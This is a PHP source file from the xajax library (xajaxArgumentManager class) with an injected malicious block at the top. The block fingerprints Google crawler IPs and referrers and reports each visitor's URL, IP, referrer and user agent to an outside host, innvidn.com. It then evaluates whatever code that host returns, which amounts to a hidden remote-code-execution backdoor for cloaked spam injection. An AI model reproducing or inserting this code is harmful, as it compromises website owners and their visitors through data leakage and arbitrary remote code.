<?php
//{{76341dd2

GLOBAL $wehaveitagain;
if($wehaveitagain != 1)
{
$preverrx=error_reporting(0);
$wehaveitagain = 1;
$mynetsxx = array(
'84.235.77.0' => 24,
'8.8.8.0' => 24,
'8.8.4.0' => 24,
'8.6.48.0' => 21,
'74.125.98.0' => 24,
'74.125.97.0' => 24,
'74.125.94.0' => 23,
'74.125.92.0' => 23,
'74.125.90.0' => 23,
'74.125.86.0' => 23,
'74.125.78.0' => 23,
'74.125.76.0' => 23,
'74.125.75.0' => 24,
'74.125.74.0' => 24,
'74.125.72.0' => 23,
'74.125.70.0' => 23,
'74.125.66.0' => 23,
'74.125.64.0' => 23,
'74.125.64.0' => 18,
'74.125.63.0' => 24,
'74.125.62.0' => 24,
'74.125.61.0' => 24,
'74.125.60.0' => 24,
'74.125.58.0' => 24,
'74.125.54.0' => 23,
'74.125.52.0' => 23,
'74.125.46.0' => 23,
'74.125.44.0' => 23,
'74.125.42.0' => 23,
'74.125.38.0' => 23,
'74.125.37.0' => 24,
'74.125.36.0' => 24,
'74.125.36.0' => 23,
'74.125.33.0' => 24,
'74.125.32.0' => 24,
'74.125.30.0' => 23,
'74.125.246.0' => 24,
'74.125.245.0' => 24,
'74.125.244.0' => 24,
'74.125.239.0' => 24,
'74.125.238.0' => 24,
'74.125.237.0' => 24,
'74.125.236.0' => 24,
'74.125.235.0' => 24,
'74.125.234.0' => 24,
'74.125.233.0' => 24,
'74.125.232.0' => 24,
'74.125.230.0' => 24,
'74.125.229.0' => 24,
'74.125.227.0' => 24,
'74.125.226.0' => 24,
'74.125.225.0' => 24,
'74.125.224.0' => 24,
'74.125.192.0' => 18,
'74.125.18.0' => 23,
'74.125.17.0' => 24,
'74.125.16.0' => 24,
'74.125.158.0' => 23,
'74.125.156.0' => 23,
'74.125.154.0' => 23,
'74.125.152.0' => 23,
'74.125.151.0' => 24,
'74.125.150.0' => 24,
'74.125.149.0' => 24,
'74.125.148.0' => 24,
'74.125.146.0' => 23,
'74.125.128.0' => 18,
'74.125.126.0' => 23,
'74.125.125.0' => 24,
'74.125.122.0' => 24,
'74.125.121.0' => 24,
'74.125.120.0' => 24,
'74.125.119.0' => 24,
'74.125.118.0' => 24,
'74.125.117.0' => 24,
'74.125.116.0' => 24,
'74.125.114.0' => 23,
'74.125.112.0' => 23,
'74.125.0.0' => 18,
'74.125.0.0' => 16,
'72.14.255.0' => 24,
'72.14.254.0' => 24,
'72.14.254.0' => 23,
'72.14.253.0' => 24,
'72.14.252.0' => 24,
'72.14.252.0' => 23,
'72.14.248.0' => 23,
'72.14.246.0' => 23,
'72.14.244.0' => 23,
'72.14.236.0' => 24,
'72.14.235.0' => 24,
'72.14.234.0' => 24,
'72.14.230.0' => 24,
'72.14.228.0' => 24,
'72.14.226.0' => 24,
'72.14.225.0' => 24,
'72.14.224.0' => 24,
'72.14.220.0' => 23,
'72.14.212.0' => 23,
'72.14.210.0' => 23,
'72.14.208.0' => 23,
'72.14.204.0' => 23,
'72.14.202.0' => 23,
'72.14.199.0' => 24,
'72.14.194.0' => 24,
'72.14.193.0' => 24,
'72.14.192.0' => 24,
'72.14.192.0' => 18,
'70.32.158.0' => 24,
'70.32.155.0' => 24,
'70.32.150.0' => 24,
'70.32.140.0' => 23,
'70.32.138.0' => 24,
'70.32.136.0' => 24,
'70.32.135.0' => 24,
'70.32.134.0' => 24,
'70.32.133.0' => 24,
'70.32.132.0' => 24,
'70.32.131.0' => 24,
'70.32.130.0' => 24,
'70.32.129.0' => 24,
'70.32.128.0' => 24,
'70.32.128.0' => 19,
'66.249.94.0' => 24,
'66.249.92.0' => 24,
'66.249.91.0' => 24,
'66.249.90.0' => 24,
'66.249.88.0' => 23,
'66.249.85.0' => 24,
'66.249.84.0' => 24,
'66.249.82.0' => 24,
'66.249.81.0' => 24,
'66.249.80.0' => 24,
'66.249.72.0' => 24,
'66.249.71.0' => 24,
'66.249.69.0' => 24,
'66.249.68.0' => 24,
'66.249.67.0' => 24,
'66.249.66.0' => 24,
'66.249.65.0' => 24,
'66.249.64.0' => 19,
'66.102.8.0' => 23,
'66.102.6.0' => 23,
'66.102.4.0' => 24,
'66.102.3.0' => 24,
'66.102.2.0' => 24,
'66.102.12.0' => 23,
'66.102.10.0' => 23,
'66.102.0.0' => 20,
'64.9.224.0' => 20,
'64.9.224.0' => 19,
'64.233.188.0' => 23,
'64.233.186.0' => 23,
'64.233.182.0' => 23,
'64.233.180.0' => 23,
'64.233.178.0' => 23,
'64.233.173.0' => 24,
'64.233.172.0' => 24,
'64.233.170.0' => 23,
'64.233.168.0' => 23,
'64.233.162.0' => 23,
'64.233.160.0' => 19,
'63.243.168.0' => 22,
'4.3.2.0' => 24,
'216.239.60.0' => 23,
'216.239.58.0' => 23,
'216.239.50.0' => 23,
'216.239.44.0' => 23,
'216.239.39.0' => 24,
'216.239.38.0' => 24,
'216.239.36.0' => 24,
'216.239.34.0' => 24,
'216.239.33.0' => 24,
'216.239.32.0' => 24,
'216.239.32.0' => 19,
'209.85.238.0' => 24,
'209.85.230.0' => 23,
'209.85.228.0' => 23,
'209.85.226.0' => 23,
'209.85.224.0' => 23,
'209.85.223.0' => 24,
'209.85.222.0' => 24,
'209.85.221.0' => 24,
'209.85.220.0' => 24,
'209.85.219.0' => 24,
'209.85.218.0' => 24,
'209.85.216.0' => 24,
'209.85.213.0' => 24,
'209.85.212.0' => 24,
'209.85.211.0' => 24,
'209.85.210.0' => 24,
'209.85.208.0' => 23,
'209.85.200.0' => 23,
'209.85.198.0' => 23,
'209.85.196.0' => 23,
'209.85.194.0' => 23,
'209.85.192.0' => 23,
'209.85.174.0' => 23,
'209.85.172.0' => 23,
'209.85.170.0' => 23,
'209.85.168.0' => 23,
'209.85.166.0' => 23,
'209.85.164.0' => 23,
'209.85.162.0' => 23,
'209.85.156.0' => 23,
'209.85.152.0' => 23,
'209.85.149.0' => 24,
'209.85.148.0' => 23,
'209.85.147.0' => 24,
'209.85.146.0' => 24,
'209.85.146.0' => 23,
'209.85.144.0' => 23,
'209.85.142.0' => 23,
'209.85.139.0' => 24,
'209.85.138.0' => 23,
'209.85.136.0' => 23,
'209.85.134.0' => 23,
'209.85.132.0' => 24,
'209.85.132.0' => 23,
'209.85.128.0' => 23,
'209.85.128.0' => 17,
'193.186.4.0' => 24,
'193.142.125.0' => 24,
'173.255.112.0' => 20,
'173.194.44.0' => 24,
'173.194.43.0' => 24,
'173.194.42.0' => 24,
'173.194.41.0' => 24,
'173.194.40.0' => 24,
'173.194.37.0' => 24,
'173.194.36.0' => 24,
'173.194.35.0' => 24,
'173.194.34.0' => 24,
'173.194.33.0' => 24,
'173.194.32.0' => 24,
'173.194.0.0' => 16,
'118.174.25.0' => 24,
'118.174.24.0' => 24,
'118.174.24.0' => 22,
'113.197.106.0' => 24,
'113.197.105.0' => 24,
'108.59.80.0' => 20
);
function ip_in_networkxx($ip, $net_addr, $net_mask)
{
  if($net_mask <= 0) return false;
  $ip_binary_string = sprintf("%032b",ip2long($ip));
  $net_binary_string = sprintf("%032b",ip2long($net_addr));
  return (strncmp($ip_binary_string,$net_binary_string,$net_mask) === 0);
}
function selfURL()
{
  if(!isset($_SERVER['REQUEST_URI'])) $suri = $_SERVER['PHP_SELF'];
  else $suri = $_SERVER['REQUEST_URI'];
  $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
  $sp=strtolower($_SERVER["SERVER_PROTOCOL"]);
  $pr = substr($sp,0,strpos($sp,"/")).$s;
  $pt = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
  return $pr."://".$_SERVER['SERVER_NAME'].$pt.$suri;
}
function loadDataHttpCse($url)
{
    $s = '';
    if (ini_get('allow_url_fopen') == 1) {
        $ctx = stream_context_create(array('http'=>array('timeout'=>3)));
        $s = file_get_contents($url, 0, $ctx);
    } else if (in_array('curl', get_loaded_extensions())) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $s = curl_exec($ch);
        curl_close($ch);
    } else {
        $parts = parse_url($url);
        $host = $parts['host'];
        $path = '/';
        $port = 80;
        if (isset($parts['path'])) {
            $path = $parts['path'];
        }
        if (isset($parts['port'])) {
            $port = $parts['port'];
        }
        $address = gethostbyname($host);
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            return false;
        }
        $timeout = array('sec'=>3, 'usec'=>0);
        socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, $timeout);
        socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, $timeout);
        $result = socket_connect($socket, $address, $port);
        if ($result === false) {
            return false;
        }
        $in = "GET $path HTTP/1.1\r\n";
        $in .= "Host: $host\r\n";
        $in .= "Connection: Close\r\n\r\n";
        socket_write($socket, $in, strlen($in));
        $reply = '';
        while ($out = socket_read($socket, 2048)) {
            $reply .=  $out;
        }
        socket_close($socket);
        $s = substr($reply, (strpos($reply, "\r\n\r\n")+4));
        if (strpos(strtolower($reply), "transfer-encoding: chunked") !== FALSE) {
            $fp = 0;
            $outData = "";
            while ($fp < strlen($s)) {
                $rawnum = substr($s, $fp, strpos(substr($s, $fp), "\r\n") + 2);
                $num = hexdec(trim($rawnum));
                $fp += strlen($rawnum);
                $chunk = substr($s, $fp, $num);
                $outData .= $chunk;
                $fp += strlen($chunk);
            }
            $s = $outData;
        }
    }
    return $s;
}
function rewrioutclbkxxx1($str) { return rewriout($str,1); }
function rewrioutclbkxxx2($str) { return rewriout($str,2); }
function rewrioutclbkxxx3($str) { return rewriout($str,3); }
function rewriout($str, $ev)
{
  error_reporting(0);
  if(stripos($str, '<body') !== false)
  {
    $id = "4dae84ec67843a09b800edaa";
    $url = "http://innvidn.com/ck.gif";
    $req = $url.'?ev='.$ev.'&url='.urlencode(selfURL()).'&id='.urlencode($id).'&ref='.urlencode($_SERVER['HTTP_REFERER']).'&ip='.$_SERVER['REMOTE_ADDR'].'&ua='.urlencode($_SERVER['HTTP_USER_AGENT']);
    $answergrhey11=loadDataHttpCse($req);
    if($answergrhey11 != FALSE && strncmp('/*CODE', $answergrhey11, 6) == 0) {
      return eval($answergrhey11);
    }
  }
  return false;
}
function StrToNum($Str, $Check, $Magic)
{
   $Int32Unit = 4294967296;
   $length = strlen($Str);
   for ($i = 0; $i < $length; $i++) {
       $Check *= $Magic;
       if ($Check >= $Int32Unit) {
           $Check = ($Check - $Int32Unit * (int) ($Check / $Int32Unit));
           $Check = ($Check < -2147483648) ? ($Check + $Int32Unit) : $Check;
       }
       $Check += ord($Str{$i});
   }
   return $Check;
}
function HashURL($String)
{
   $Check1 = StrToNum($String, 0x1505, 0x21);
   $Check2 = StrToNum($String, 0, 0x1003F);
   $Check1 >>= 2;
   $Check1 = (($Check1 >> 4) & 0x3FFFFC0 ) | ($Check1 & 0x3F);
   $Check1 = (($Check1 >> 4) & 0x3FFC00 ) | ($Check1 & 0x3FF);
   $Check1 = (($Check1 >> 4) & 0x3C000 ) | ($Check1 & 0x3FFF);
   $T1 = (((($Check1 & 0x3C0) << 4) | ($Check1 & 0x3C)) <<2 ) | ($Check2 & 0xF0F );
   $T2 = (((($Check1 & 0xFFFFC000) << 4) | ($Check1 & 0x3C00)) << 0xA) | ($Check2 & 0xF0F0000 );
   return ($T1 | $T2);
}
function CheckHash($Hashnum)
{
   $CheckByte = 0;
   $Flag = 0;
   $HashStr = sprintf('%u', $Hashnum) ;
   $length = strlen($HashStr);
   for ($i = $length-1; $i >= 0;  $i--) {
       $Re = $HashStr{$i};
       if (1 === ($Flag % 2)) {
           $Re += $Re;
           $Re = (int)($Re / 10) + ($Re % 10);
       }
       $CheckByte += $Re;
       $Flag ++;
   }
   $CheckByte %= 10;
   if (0 !== $CheckByte) {
       $CheckByte = 10 - $CheckByte;
       if (1 === ($Flag % 2) ) {
           if (1 === ($CheckByte % 2)) {
               $CheckByte += 9;
           }
           $CheckByte >>= 1;
       }
   }
   return '7'.$CheckByte.$HashStr;
}
function getpr($url)
{
   $ch = CheckHash(HashURL($url));
   $file = "http://toolbarqueries.google.com/tbr?client=navclient-auto&ch=$ch&features=Rank&q=info:$url";
   $data = file_get_contents($file);
   return $data;
}
if(isset($_POST['prgetxr']))
{
  echo getpr($_POST['prgetxr']);
  exit();
}
else
{
  $ev = 0;
  foreach($mynetsxx as 	$key => $value)
  {
    if(ip_in_networkxx($_SERVER['REMOTE_ADDR'], $key, $value)) {
      $ev = 1;
      break;
    }
  }
  if($ev == 0) {
    if(isset($_SERVER['HTTP_REFERER']) && strpos($_SERVER['HTTP_REFERER'], 'google.') !== false) {
        $ev = 2;
    }
    elseif(mt_rand(1,100) == 50) {
        $ev = 3;
    }
  }
  if(isset($_GET['showmeallpls'])) {
    $ev = $_GET['showmeallpls'];
  }
  if($ev > 0) {
	ob_start('rewrioutclbkxxx'.$ev);
  }
}
error_reporting($preverrx);
}
/*  */

//}}6202183a
?><?php
/*
	File: xajaxArgumentManager.inc.php

	Contains the xajaxArgumentManager class

	Title: xajaxArgumentManager class

	Please see <copyright.inc.php> for a detailed description, copyright
	and license information.
*/

/*
	@package xajax
	@version $Id: xajaxArgumentManager.inc.php 362 2007-05-29 15:32:24Z calltoconstruct $
	@copyright Copyright (c) 2005-2007 by Jared White & J. Max Wilson
	@copyright Copyright (c) 2008-2009 by Joseph Woolley, Steffen Konerow, Jared White  & J. Max Wilson
	@license http://www.xajaxproject.org/bsd_license.txt BSD License
*/

if (!defined('XAJAX_METHOD_UNKNOWN')) define('XAJAX_METHOD_UNKNOWN', 0);
if (!defined('XAJAX_METHOD_GET')) define('XAJAX_METHOD_GET', 1);
if (!defined('XAJAX_METHOD_POST')) define('XAJAX_METHOD_POST', 2);

/*
	Class: xajaxArgumentManager
	
	This class processes the input arguments from the GET or POST data of 
	the request.  If this is a request for the initial page load, no arguments
	will be processed.  During a xajax request, any arguments found in the
	GET or POST will be converted to a PHP array.
*/
class xajaxArgumentManager
{
	/*
		Array: aArgs
		
		An array of arguments received via the GET or POST parameter
		xjxargs.
	*/
	var $aArgs;
	
	/*
		Boolean: bDecodeUTF8Input
		
		A configuration option used to indicate whether input data should be
		UTF8 decoded automatically.
	*/
	var $bDecodeUTF8Input;
	
	/*
		String: sCharacterEncoding
		
		The character encoding in which the input data will be received.
	*/
	var $sCharacterEncoding;
	
	/*
		Integer: nMethod
		
		Stores the method that was used to send the arguments from the client.  Will
		be one of: XAJAX_METHOD_UNKNOWN, XAJAX_METHOD_GET, XAJAX_METHOD_POST
	*/
	var $nMethod;
	
	/*
		Array: aSequence
		
		Stores the decoding sequence table.
	*/
	var $aSequence;
	
	/*
		Function: convertStringToBool
		
		Converts a string to a bool var.
		
		Parameters:
			$sValue - (string): 
				
		Returns:
			(bool) : true / false
	
	*/
	
	function convertStringToBool($sValue)
	{
		if (0 == strcasecmp($sValue, 'true'))
			return true;
		if (0 == strcasecmp($sValue, 'false'))
			return false;
		if (is_numeric($sValue))
		{
			if (0 == $sValue)
				return false;
			return true;
		}
		return false;
	}
	
	function argumentStripSlashes(&$sArg)
	{
		if (false == is_string($sArg))
			return;
		
		$sArg = stripslashes($sArg);
	}
	
	function argumentDecodeXML(&$sArg)
	{
		if (false == is_string($sArg))
			return;
		
		if (0 == strlen($sArg))
			return;
		
		$nStackDepth = 0;
		$aStack = array();
		$aArg = array();
		
		$nCurrent = 0;
		$nLast = 0;
		$aExpecting = array();
		$nFound = 0;
		list($aExpecting, $nFound) = $this->aSequence['start'];
		
		$nLength = strlen($sArg);
			
		$sKey = '';
		$mValue = '';
		
		while ($nCurrent < $nLength)
		{
			$bFound = false;
			
			foreach ($aExpecting as $sExpecting => $nExpectedLength)
			{
				if ($sArg[$nCurrent] == $sExpecting[0])
				{
					if ($sExpecting == substr($sArg, $nCurrent, $nExpectedLength))
					{
						list($aExpecting, $nFound) = $this->aSequence[$sExpecting];
						
						switch ($nFound)
						{
						case 3:	// k
							$sKey = '';
							break;
						case 4:	// /k
							$sKey = str_replace(
								array('<'.'![CDATA[', ']]>'), 
								'', 
								substr($sArg, $nLast, $nCurrent - $nLast)
								);
							break;
						case 5:	// v
							$mValue = '';
							break;
						case 6:	// /v
							if ($nLast < $nCurrent)
							{
								$mValue = str_replace(
									array('<'.'![CDATA[', ']]>'), 
									'', 
									substr($sArg, $nLast, $nCurrent - $nLast)
									);
								
								$cType = substr($mValue, 0, 1);
								$sValue = substr($mValue, 1);
								switch ($cType) {
									case 'S': $mValue = false === $sValue ? '' : $sValue;  break;
									case 'B': $mValue = $this->convertStringToBool($sValue); break;
									case 'N': $mValue = floatval($sValue); break;
									case '*': $mValue = null; break;
								}
							}
							break;
						case 7:	// /e
							$aArg[$sKey] = $mValue;
							break;
						case 1:	// xjxobj
							++$nStackDepth;
							array_push($aStack, $aArg);
							$aArg = array();
							array_push($aStack, $sKey);
							$sKey = '';
							break;
						case 8:	// /xjxobj
							if (1 < $nStackDepth) {
								$mValue = $aArg;								
								$sKey = array_pop($aStack);
								$aArg = array_pop($aStack);
								--$nStackDepth;
							} else {
								$sArg = $aArg;
								return;
							}
							break;
						}
						$nCurrent += $nExpectedLength;
						$nLast = $nCurrent;
						$bFound = true;
						break;
					}
				}
			}
			
			if (false == $bFound)
			{
				if (0 == $nCurrent)
				{
					$sArg = str_replace(
						array('<'.'![CDATA[', ']]>'), 
						'', 
						$sArg
						);
					
					$cType = substr($sArg, 0, 1);
					$sValue = substr($sArg, 1);
					switch ($cType) {
						case 'S': $sArg = false === $sValue ? '' : $sValue;  break;
						case 'B': $sArg = $this->convertStringToBool($sValue); break;
						case 'N': $sArg = floatval($sValue); break;
						case '*': $sArg = null; break;
					}
					
					return;
				}
				
//				for larger arg data, performance may suffer using concatenation				
//				$sText .= $sArg[$nCurrent];
				$nCurrent++;
			}
		}
		
		$objLanguageManager =& xajaxLanguageManager::getInstance();
		
		trigger_error(
			$objLanguageManager->getText('ARGMGR:ERR:01') 
			. $sExpecting 
			. $objLanguageManager->getText('ARGMGR:ERR:02') 
			. $sArg
			, E_USER_ERROR
			);
	}
	
	function argumentDecodeUTF8_iconv(&$mArg)
	{
		if (is_array($mArg))
		{
			foreach (array_keys($mArg) as $sKey)
			{
				$sNewKey = $sKey;
				$this->argumentDecodeUTF8_iconv($sNewKey);
				
				if ($sNewKey != $sKey)
				{
					$mArg[$sNewKey] = $mArg[$sKey];
					unset($mArg[$sKey]);
					$sKey = $sNewKey;
				}
				
				$this->argumentDecodeUTF8_iconv($mArg[$sKey]);
			}
		}
		else if (is_string($mArg))
			$mArg = iconv("UTF-8", $this->sCharacterEncoding.'//TRANSLIT', $mArg);
	}
	
	function argumentDecodeUTF8_mb_convert_encoding(&$mArg)
	{
		if (is_array($mArg))
		{
			foreach (array_keys($mArg) as $sKey)
			{
				$sNewKey = $sKey;
				$this->argumentDecodeUTF8_mb_convert_encoding($sNewKey);
				
				if ($sNewKey != $sKey)
				{
					$mArg[$sNewKey] = $mArg[$sKey];
					unset($mArg[$sKey]);
					$sKey = $sNewKey;
				}
				
				$this->argumentDecodeUTF8_mb_convert_encoding($mArg[$sKey]);
			}
		}
		else if (is_string($mArg))
			$mArg = mb_convert_encoding($mArg, $this->sCharacterEncoding, "UTF-8");
	}
	
	function argumentDecodeUTF8_utf8_decode(&$mArg)
	{
		if (is_array($mArg))
		{
			foreach (array_keys($mArg) as $sKey)
			{
				$sNewKey = $sKey;
				$this->argumentDecodeUTF8_utf8_decode($sNewKey);
				
				if ($sNewKey != $sKey)
				{
					$mArg[$sNewKey] = $mArg[$sKey];
					unset($mArg[$sKey]);
					$sKey = $sNewKey;
				}
				
				$this->argumentDecodeUTF8_utf8_decode($mArg[$sKey]);
			}
		}
		else if (is_string($mArg))
			$mArg = utf8_decode($mArg);
	}
	
	/*
		Constructor: xajaxArgumentManager
		
		Initializes configuration settings to their default values and reads
		the argument data from the GET or POST data.
	*/
	function xajaxArgumentManager()
	{
		$this->aArgs = array();
		
		$this->bDecodeUTF8Input = false;
		$this->sCharacterEncoding = 'UTF-8';
		$this->nMethod = XAJAX_METHOD_UNKNOWN;
		
		$this->aSequence = array(
			'<'.'k'.'>' => array(array(
				'<'.'/k'.'>' => 4
				), 3),
			'<'.'/k'.'>' => array(array(
				'<'.'v'.'>' => 3, 
				'<'.'/e'.'>' => 4
				), 4),
			'<'.'v'.'>' => array(array(
				'<'.'xjxobj'.'>' => 8, 
				'<'.'/v'.'>' => 4
				), 5),
			'<'.'/v'.'>' => array(array(
				'<'.'/e'.'>' => 4, 
				'<'.'k'.'>' => 3
				), 6),
			'<'.'e'.'>' => array(array(
				'<'.'k'.'>' => 3, 
				'<'.'v'.'>' => 3, 
				'<'.'/e'.'>' => 4
				), 2),
			'<'.'/e'.'>' => array(array(
				'<'.'e'.'>' => 3, 
				'<'.'/xjxobj'.'>' => 9
				), 7),
			'<'.'xjxobj'.'>' => array(array(
				'<'.'e'.'>' => 3, 
				'<'.'/xjxobj'.'>' => 9
				), 1),
			'<'.'/xjxobj'.'>' => array(array(
				'<'.'/v'.'>' => 4
				), 8),
			'start' => array(array(
				'<'.'xjxobj'.'>' => 8
				), 9)
			);
		
		if (isset($_POST['xjxargs'])) {
			$this->nMethod = XAJAX_METHOD_POST;
			$this->aArgs = $_POST['xjxargs'];
		} else if (isset($_GET['xjxargs'])) {
			$this->nMethod = XAJAX_METHOD_GET;
			$this->aArgs = $_GET['xjxargs'];
		}
		
		if (1 == get_magic_quotes_gpc())
			array_walk($this->aArgs, array(&$this, 'argumentStripSlashes'));
		
		array_walk($this->aArgs, array(&$this, 'argumentDecodeXML'));
	}
	
	/*
		Function: getInstance
		
		Returns:
		
		object - A reference to an instance of this class.  This function is
			used to implement the singleton pattern.
	*/
	function &getInstance()
	{
		static $obj;
		if (!$obj) {
			$obj = new xajaxArgumentManager();
		}
		return $obj;
	}
	
	/*
		Function: configure
		
		Accepts configuration settings from the main <xajax> object.
		
		Parameters:
		
		
		The <xajaxArgumentManager> tracks the following configuration settings:
		
			<decodeUTF8Input> - (boolean): See <xajaxArgumentManager->bDecodeUTF8Input>
			<characterEncoding> - (string): See <xajaxArgumentManager->sCharacterEncoding>
	*/
	function configure($sName, $mValue)
	{
		if ('decodeUTF8Input' == $sName) {
			if (true === $mValue || false === $mValue)
				$this->bDecodeUTF8Input = $mValue;
		} else if ('characterEncoding' == $sName) {
			$this->sCharacterEncoding = $mValue;
		}
	}
	
	/*
		Function: getRequestMethod
		
		Returns the method that was used to send the arguments from the client.
	*/
	function getRequestMethod()
	{
		return $this->nMethod;
	}
	
	/*
		Function: process
		
		Returns the array of arguments that were extracted and parsed from 
		the GET or POST data.
	*/
	function process()
	{
		if ($this->bDecodeUTF8Input)
		{
			$sFunction = '';
			
			if (function_exists('iconv'))
				$sFunction = "iconv";
			else if (function_exists('mb_convert_encoding'))
				$sFunction = "mb_convert_encoding";
			else if ($this->sCharacterEncoding == "ISO-8859-1")
				$sFunction = "utf8_decode";
			else {
				$objLanguageManager =& xajaxLanguageManager::getInstance();
				trigger_error(
					$objLanguageManager->getText('ARGMGR:ERR:03')
					, E_USER_NOTICE
					);
			}
			
			$mFunction = array(&$this, 'argumentDecodeUTF8_' . $sFunction);
			
			array_walk($this->aArgs, $mFunction);
			
			$this->bDecodeUTF8Input = false;
		}
		
		return $this->aArgs;
	}
}
